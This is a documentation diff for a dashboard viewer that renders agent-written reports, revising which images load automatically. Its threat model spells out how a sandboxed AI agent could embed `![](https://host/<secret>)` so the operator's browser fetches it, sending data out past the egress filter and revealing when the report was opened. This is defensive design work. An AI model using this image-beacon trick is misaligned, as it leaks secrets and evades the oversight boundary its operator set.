@@ -1586,16 +1586,40 @@ become links at all — a relative or fragment target would resolve against the
 dashboard's own origin rather than the repository its author meant, so it keeps
 its text and loses the anchor.
 
-Images are **inline-only**: a `data:` raster URI renders, and every remote or
-relative `src` degrades to the image's alt text. An `<img>` is the one thing in
-a document that reaches the network without the operator clicking anything, and
-the document's author is an agent that may be running behind tclaude's own
-egress boundary (see [Linux network filtering](linux-network-filtering.md)). A
-remote `src` would let such an agent write `![](https://host/<secret>)` and have
-the operator's unfiltered browser make the request it could not — carrying data
-out around the sandbox the operator configured, and revealing that (and when)
-the report was opened. Suppressing the referrer would hide which host asked, not
-that the request happened, so the viewer does not make the request at all.
+A document can carry **images**, from three places, which the viewer does not
+treat alike.
+
+A self-contained `data:` raster URI renders on sight — it reaches nothing. So
+does a reference to a **file published with the same notification**: an agent
+that runs `notify-human --attach report.md --attach chart.png` can write
+`![the chart](chart.png)` in the report and have the image appear in the
+document. The reference is matched against the published filenames — after
+percent-decoding, ignoring a leading `./`, and ignoring case — and resolves to
+that file's own authenticated download route on the daemon. Only files the
+daemon has confirmed are raster images (the same content-sniffed `previewable`
+verdict behind the attachment thumbnail, SVG excluded) can be referenced this
+way; a reference to anything else, or to a name nothing published, degrades to
+the image's alt text.
+
+A **remote `http(s)` image** is described rather than fetched. It renders as a
+placeholder carrying the alt text and the host, with a **Load image** button;
+the request happens when the operator clicks it, and not before. A document
+holding back more than one gets a single line above it offering to load them
+all. Once loaded, the image is requested with `referrerpolicy="no-referrer"`.
+The reason for the click is that an `<img>` is the one thing in a document that
+reaches the network without the operator doing anything, and the document's
+author is an agent that may be running behind tclaude's own egress boundary
+(see [Linux network filtering](linux-network-filtering.md)). Rendered eagerly,
+such an agent could write `![](https://host/<secret>)` and have the operator's
+unfiltered browser make the request it could not — carrying data out around the
+sandbox the operator configured, and revealing that (and when) the report was
+opened. Suppressing the referrer would hide which host asked, not that the
+request happened, so the viewer makes no request the operator did not choose.
+
+Every other `src` — a relative name matching nothing published, an absolute
+path, a protocol-relative `//host/x`, a `data:` URI that is not a trusted
+raster type — degrades to the alt text, for the same reason the equivalent link
+targets lose their anchor.
 
 The daemon copies the bytes into its private data directory, so remote
 dashboards download through an authenticated route rather than receiving access to the agent's filesystem.
